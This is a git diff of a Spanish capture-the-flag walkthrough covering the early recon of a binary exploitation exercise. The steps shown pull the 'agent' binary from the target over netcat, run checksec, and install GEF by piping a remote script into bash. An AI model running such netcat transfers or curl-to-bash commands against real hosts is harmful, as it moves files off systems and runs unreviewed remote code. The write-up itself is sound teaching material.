@@ -246,7 +246,7 @@ export SHELL=bash
 
 - Una ves visto eso, lo que hacemos ahora es pasarnos el **binario Agent** a nuestra máquina de atacante y poder jugar con **GDB-GEF** 
 
-```bash
+```css
 #Máquina atacante
 nc -nlvp 4444 > agent
 
@@ -260,9 +260,28 @@ nc ip 4444 < agent
 ![image](https://github.com/user-attachments/assets/05d401a8-b45f-4e30-85f0-05b82e94d022)
 ![image](https://github.com/user-attachments/assets/212da93e-7a31-491b-90a9-87479336a4d1)
 
+- Ahora vamos a ver las protecciones del binario con `checksec` y vemos que no tiene ninguna protección
+	- Como el NX no esta habilitado , el Shellcode nos lo va a interpretar
 
+```ruby
+sudo apt update -y && sudo apt upgrade -y
+sudo apt install checksec
+sudo apt install python3-pwntools
+```
 
+![image](https://github.com/user-attachments/assets/63ab7432-bff1-4d18-b6cf-43dbd3b78cff)
 
+### Instalar GDB-GEF
+
+```css
+sudo apt install gdb
+bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+```
+
+# ASLR *->* Habilitado
+
+- Como están cambiando los números esto quiere decir que el **ASLR** está **HABILITADO**
+	- Como los números son cortos vemos que estamos en **máquina de 32 bits** (haciendo un `file agent` tamb podes ver que el binario es de 32-bit)
 
 
 
